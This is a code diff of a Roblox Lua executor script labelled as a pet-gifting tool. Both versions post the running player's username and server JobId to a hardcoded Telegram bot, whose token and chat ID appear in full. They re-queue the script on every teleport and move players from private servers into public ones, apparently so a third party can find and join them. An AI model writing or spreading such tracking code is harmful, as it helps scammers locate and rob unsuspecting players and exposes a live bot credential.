@@ -1,79 +1,48 @@
-warn("[PETGIFT] Script started with Telegram logging")
-
-local DEBUG_TAG = "[PETGIFT]"
-local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
 local PLACE_ID = 126884695634066
-
--- Telegram configuration
 local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
 local TELEGRAM_CHAT_ID = "2001061743"
 
--- Executor request function
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
-local function debugPrint(...)
-	print(DEBUG_TAG, ...)
-end
-
+-- Function to send Telegram log
 local function sendTelegramLog(reason)
-	if not requestFunc then
-		warn(DEBUG_TAG, "No request function available.")
-		return
-	end
-
-	local jobId = game.JobId
-	local username = LocalPlayer.Name
-
-	local message = string.format(
-		"🐾 PetGifting Log\n\nReason: %s\nUsername: %s\nJobId: %s",
-		reason,
-		username,
-		jobId
-	)
-
-	local payload = {
-		Url = TELEGRAM_URL,
-		Method = "POST",
-		Headers = {["Content-Type"] = "application/json"},
-		Body = HttpService:JSONEncode({
-			chat_id = TELEGRAM_CHAT_ID,
-			text = message
-		})
-	}
-
-	pcall(function() requestFunc(payload) end)
+    if not requestFunc then return end
+    local message = string.format("JobId: %s\nReason: %s\nUsername: %s", game.JobId, reason, LocalPlayer.Name)
+    pcall(function()
+        requestFunc({
+            Url = TELEGRAM_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({chat_id = TELEGRAM_CHAT_ID, text = message})
+        })
+    end)
 end
 
--- Queue this script to run again after teleport
+-- Queue script to run after teleport
 if syn and syn.queue_on_teleport then
-	syn.queue_on_teleport(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_SCRIPT"))() -- Replace with your actual raw script
-	end)
+    syn.queue_on_teleport(script.Source)
 elseif queue_on_teleport then
-	queue_on_teleport(function()
-		loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_SCRIPT"))()
-	end)
+    queue_on_teleport(script.Source)
 end
 
--- Send JobId immediately on script start
-sendTelegramLog(Players.PrivateServerId and "Started in private server" or "Started in public server")
+-- Send JobId for current server
+sendTelegramLog("Current server")
 
--- Hop only if in private server
-if Players.PrivateServerId then
-	debugPrint("Private server detected. Hopping...")
-	TeleportService:Teleport(PLACE_ID, LocalPlayer)
+-- Only hop if in a private server
+if game.PrivateServerId and game.PrivateServerId ~= "" then
+    -- Get public servers list
+    local serversJson = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"))
+    for _, server in ipairs(serversJson.data) do
+        if server.playing < server.maxPlayers and server.id ~= game.JobId then
+            TeleportService:TeleportToPlaceInstance(PLACE_ID, server.id, {LocalPlayer})
+            break
+        end
+    end
 else
-	debugPrint("Public server detected. No hop will be done.")
+    print("Already in a public server, not hopping.")
 end
-
--- Send JobId after teleport
-Players.PlayerAdded:Connect(function(plr)
-	if plr == LocalPlayer then
-		debugPrint("Player joined after hop, sending JobId")
-		sendTelegramLog("Joined new server after hop")
-	end
-end)
